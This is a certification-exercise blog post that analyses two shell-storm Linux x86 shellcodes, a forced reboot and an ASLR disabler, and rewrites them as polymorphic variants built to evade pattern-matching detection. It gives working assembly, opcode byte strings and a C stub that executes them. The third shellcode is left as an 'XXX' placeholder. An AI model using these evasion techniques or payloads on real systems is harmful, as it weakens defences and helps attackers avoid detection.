---
layout: post
title: "SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification"
description: "SLAE Problem 6: Shell-Storm.com Shellcode Analysis and Polymorphic Modification"
tags: [asm, shellcode, polymorphic]
---

This blog post has been created for completing the requirements for the SecurityTube
Linux Assembly Expert certification:
[<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert)

Student ID: SLAE-824

## Requirements

- Take 3 shellcodes from Shell-Storm and create polymorphic versions
  of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing
  shellcode
- Bonus points for making it shorter in length than original

### Approach

I have chosen the following 3 shellcodes to make polymorphic from
[shell-strom.org](http://shell-storm.org/shellcode/):
- [reboot](http://shell-storm.org/shellcode/files/shellcode-831.php)
- XXX
- XXX

My approach will be to:

- Take each shellcode and analyze it to understand what it does
- Place it in a sample stub c program to try it out to make sure it
  works before modification
- Modify the shellcode with garbage instructions and equivalent
  instructions
- Place the modified shellcode into the stub c program and verify that
  it continues to work properly

### Shellcode 1: Reboot

The shellcode for rebooting a system looks like the following. I have
converted the AT&T syntax to Intel but other than that the commands
are the same. Lets analyze it and try to understand what it does.

{% highlight nasm %}
global _start
section .text
  _start:
    xor    eax,eax    ; zero out eax
    push   eax        ; place 0x00000000 on the stack
    push   0x746f6f62 ; push toob to the stack
    push   0x65722f6e ; push er/n to the stack
    push   0x6962732f ; push ibs/ to the stack
    mov    ebx,esp    ; place pointer to /sbin/reboot string on stack
    push   eax        ; place 0x00000000 on the stack
    push word 0x662d  ; push f- to the stack
    mov    esi,esp    ; place pointer to -f argument to the stack
    push   eax        ; push 0x00000000 on the stack
    push   esi        ; place pointer to -f argument on the stack
    push   ebx        ; place pointer to /sbin/reboot string on the stack
    mov    ecx,esp    ; move pointer to argument array /sbin/reboot, -f on the stack
    mov    al,0xb     ; place system call 11 (execve) in al
    int    0x80       ; call execve
{% endhighlight %}

This looks pretty familiar. The shellcode simply populates the registers
with the arguments that execve requires:

{% highlight c %}
int execve(const char *path, char *const argv[], char *const envp[]);
{% endhighlight %}

And then executes it. Lets go ahead and throw it in a stub c program and
make sure it works but before we do, lets write a little bash function to
place in our .bashrc as I've grown tired having to derive the proper
command line incantation to dump the shellcode of a binary. Here we go:

{% highlight bash %}
function dumpsc {
  objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
}
{% endhighlight %}

_Note: if placing shellcode in cstub doesn't work it may be because
the cut -f needs to be adjusted to account for the columns of opcodes
in the objdump -d output._

Execellent. Now:

{% highlight bash %}
dumpsc reboot
"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
{% endhighlight %}

There is our shellcode. Lets throw it in our stub C program. Actually, I've
grown tired of doing that too. Lets write a function to do that for us:

{% highlight bash %}

function asmtocstub {
BYTES=`dumpsc $1`
CFILE="$2.c"
echo "The bytes of the shellcode are:"
echo $BYTES
echo "Writing shellcode to $CFILE"
cat << EOF > $CFILE
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = $BYTES;

int main(void)
{

  printf("Shellcode Length:  %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
  ret();
}
EOF
gcc -g -fno-stack-protector -z execstack -m32 $CFILE -o $2
}

{% endhighlight %}

And now:

{% highlight bash %}

$ asmtocstub reboot myshellcode
The bytes of the shellcode are:
"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
Writing shellcode to myshellcode.c
$ cat myshellcode.c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{

  printf("Shellcode Length:  %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
  ret();
}
$ ./myshellcode
Length: 36
reboot: Need to be root
$

{% endhighlight %}

Excellent. That should speed up productivity. We can see from the
output that when we execute the shellcode c program that it does
in fact try to run (although you need to be root to reboot the system).

Since we know that it works, lets start making it polymorphic.

### Ploymorphic Reboot Shellcode

Returning to our original shellcode, replace some instructions
with equivalent instructions and add some NOP garbage as well:

{% highlight nasm %}
global _start
section .text
  _start:
    ; zero out eax
    xor    eax,eax

    push   eax        ; place 0x00000000 on the stack

    ;push   0x746f6f62 ; push toob to the stack
    mov ebx, 0x736e6e61 ; place obfuscated toob in ebx
    add ebx, 0x01010101 ; add to bring ebx to 0x746f6f62
    push ebx ; push toob to the stack

    ;push   0x65722f6e ; push er/n to the stack
    ;push   0x6962732f ; push ibs/ to the stack
    mov dword [esp-4],  0x65722f6e ; push er/n to the stack
    mov dword [esp-8], 0x6962732f ; push ibs/ to the stack
    sub esp, 8

    mov    ebx,esp    ; place pointer to /sbin/reboot string on stack
    push   eax        ; place 0x00000000 on the stack
    push word 0x662d  ; push f- to the stack
    mov    esi,esp    ; place pointer to -f argument to the stack
    push   eax        ; push 0x00000000 on the stack
    push   esi        ; place pointer to -f argument on the stack
    push   ebx        ; place pointer to /sbin/reboot string on the stack
    mov    ecx,esp    ; move pointer to argument array /sbin/reboot, -f on the stack

    mov    al,0xb     ; place system call 11 (execve) in al

    int    0x80       ; call execve


{% endhighlight %}

Lets compile our new polymorphic reboot version and see if it still works:

{% highlight bash %}

$ ./compile.sh polyreboot
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
$ ./polyreboot
reboot: Need to be root
$ asmtocstub polyreboot polyrebootstub
The bytes of the shellcode are:
"\x31\xc0\x50\xbb\x61\x6e\x6e\x73\x81\xc3\x01\x01\x01\x01\x53\xc7\x44\x24\xfc\x6e\x2f\x72\x65\xc7\x44\x24\xf8\x2f\x73\x62\x69\x83\xec\x08\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
Writing shellcode to polyrebootstub.c
$ ./polyrebootstub
Shellcode Length:  52
reboot: Need to be root

{% endhighlight %}

After our obfuscation our shellcode still works. Perfect. The size of the
shellcode has grown from 36 to 52 bytes. We have kept it under the 150% size
increase limitation. Next up...


## Shellcode 2: ASLR Deactivation

The next shellcode disables ASLR on Linux x86 systems. It can be found
[http://shell-storm.org/shellcode/files/shellcode-813.php](here). Once
again, lets do some analysis before we go and try to run it.

{% highlight nasm %}
global _start
section .text
  _start:
    xor    eax,eax ; Clear out eax
    push   eax     ; Push 0x00000000 onto the stack
    push   0x65636170 ; Push ecap onto the stack
    push   0x735f6176 ; Push s_av onto the stack
    push   0x5f657a69 ; Push _ezi onto the stack
    push   0x6d6f646e ; Push modn onto the stack
    push   0x61722f6c ; Push ar/l onto the stack
    push   0x656e7265 ; Push enre onto the stack
    push   0x6b2f7379 ; Push k/sy onto the stack
    push   0x732f636f ; Push s/co onto the stack
    push   0x72702f2f ; Push rp// onto the stack
    ; At this point //proc/sys/kernel/randomize_va_space
    ; Has been pushed onto the stack
    ; According to [http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](this)
    ; This seems to be the recommended way to be disabling ASLR
    mov    ebx, esp ; place a pointer to our string on the stack

    mov    cx, 0x2bc ; mode for sys_creat call
    ; gdb --batch --ex "print /o 0x02bc" $1 = 01274
    ; consulting the man page table for mode we find
    ; S_IWUSR    00200 user has write permission
    ; S_IRWXG    00070 group has read, write, and execute permission
    ; S_IROTH    00004 others have read permission
    ; S_ISVTX  0001000 sticky bit

    mov    al, 0x8 ; sys_creat - open or create a file
    int    0x80 ; open the file

    mov    ebx,eax ; save the file descriptor
    push   eax ; push the file descriptor onto the stack

    ;; Beginning to setup the write syscall by
    ;; placing the required information into
    ;; the proper registers
    ;; ssize_t write(int fd, const void *buf, size_t count);
    mov    dx,0x3a30  ; Push :0 onto the stack
    push   dx ; push it onto the stack
    mov    ecx,esp
    xor    edx,edx
    inc    edx ; count of bytes to be written which is 1
    mov    al,0x4 ; sys_write syscall
    int    0x80

    mov    al,0x6 ; sys_close syscall
    int    0x80   ; returns 0 into eax on success

    inc    eax  ; increment eax to syscall 1 - exit syscall
    int    0x80 ; exit gracefully
{% endhighlight %}

Everything seems to look safe to run. Looking at the permissions
of `/proc/sys/kernel/randomize_va_space` we see that it is owned by
root and can only be written to by root:

{% highlight bash %}
$ stat /proc/sys/kernel/randomize_va_space
  File: ‘/proc/sys/kernel/randomize_va_space’
  Size: 0         	Blocks: 0          IO Block: 1024   regular empty file
Device: 4h/4d	Inode: 33315       Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-01-08 21:05:46.889201002 -0600
Modify: 2017-01-08 21:39:16.621201002 -0600
Change: 2017-01-08 21:39:16.621201002 -0600
 Birth: -
{% endhighlight %}

This indicates that our shelllcode will need to be run as root to be
effective. If we compile and run the shellcode with sudo we see that
it in fact does change the randomization value from 2 to 0. Let's
add in some polymorphism and see if we can keep it under 124 bytes
as we neet to stay under 150% of the original 83 byte size.


### Ploymorphic ASLR Deactivation Shellcode

{% highlight nasm %}
global _start
section .text
  _start:
    xor    eax,eax ; Clear out eax
    push   eax     ; Push 0x00000000 onto the stack

    ; Equivalent instructions for:
    ; push   0x65636170 ; Push ecap onto the stack
    mov ebx, 0x66646271
    sub ebx, 0x01010101
    push ebx

    push   0x735f6176 ; Push s_av onto the stack
    push   0x5f657a69 ; Push _ezi onto the stack
    push   0x6d6f646e ; Push modn onto the stack
    push   0x61722f6c ; Push ar/l onto the stack
    push   0x656e7265 ; Push enre onto the stack
    push   0x6b2f7379 ; Push k/sy onto the stack
    push   0x732f636f ; Push s/co onto the stack

    ; Equivalent instructions for:
    ; push   0x72702f2f ; Push rp// onto the stack
    mov ebx, 0x73713030
    sub ebx, 0x01010101
    push ebx


    ; At this point //proc/sys/kernel/randomize_va_space
    ; Has been pushed onto the stack
    ; According to [http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](this)
    ; This seems to be the recommended way to be disabling ASLR
    mov    ebx, esp ; place a pointer to our string on the stack

    cld ; For funzies

    mov    cx, 0x2bc ; mode for sys_creat call
    ; gdb --batch --ex "print /o 0x02bc" $1 = 01274
    ; consulting the man page table for mode we find
    ; S_IWUSR    00200 user has write permission
    ; S_IRWXG    00070 group has read, write, and execute permission
    ; S_IROTH    00004 others have read permission
    ; S_ISVTX  0001000 sticky bit

    ; Equivalent instructions for:
    ; mov    al, 0x8 ; sys_creat - open or create a file
    mov    al, 0x9
    sub    al, 0x1
    int    0x80 ; open the file

    mov    ebx,eax ; save the file descriptor

    ; Equivalent instructions for:
    ; push   eax ; push the file descriptor onto the stack
    mov [esp-4], eax
    sub esp, 0x4

    ;; Beginning to setup the write syscall by
    ;; placing the required information into
    ;; the proper registers
    ;; ssize_t write(int fd, const void *buf, size_t count);
    mov    dx,0x3a30  ; Push :0 onto the stack
    push   dx ; push it onto the stack
    mov    ecx,esp
    xor    edx,edx

    ; Equivalent instructions for:
    ; inc    edx ; count of bytes to be written which is 1
    inc    edx ; count of bytes to be written which is 1
    inc    edx ; for confusion
    inc    edx ; for confusion
    dec    edx ; for confusion
    dec    edx ; for confusion

    mov    al,0x4 ; sys_write syscall
    int    0x80

    mov    al,0x6 ; sys_close syscall
    int    0x80   ; returns 0 into eax on success

    inc    eax  ; increment eax to syscall 1 - exit syscall
    int    0x80 ; exit gracefully
{% endhighlight %}

After compiling and running we see:

{% highlight bash %}
$ cat /proc/sys/kernel/randomize_va_space
2
$ sudo ./deactivateaslrpoly
$ cat /proc/sys/kernel/randomize_va_space
0
{% endhighlight %}

It still works after the polymorphic adjustments. And the byte
count is:

{% highlight bash %}

$ vim ~/.bashrc
$ ./compile.sh deactivateaslrpoly
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
$ asmtocstub deactivateaslrpoly deactivateaslrpolystub
The bytes of the shellcode are:
"\x31\xc0\x50\xbb\x71\x62\x64\x66\x81\xeb\x01\x01\x01\x01\x53\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\xbb\x30\x30\x71\x73\x81\xeb\x01\x01\x01\x01\x53\x89\xe3\xfc\x66\xb9\xbc\x02\xb0\x09\x2c\x01\xcd\x80\x89\xc3\x89\x44\x24\xfc\x83\xec\x04\x66\xba\x30\x3a\x66\x52\x89\xe1\x31\xd2\x42\x42\x42\x4a\x4a\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80"
Writing shellcode to deactivateaslrpolystub.c
$ ./deactivateaslrpolystub
Shellcode Length:  110
{% endhighlight %}

Cool. Our byte length is under the 124 byte limit and works as expected!
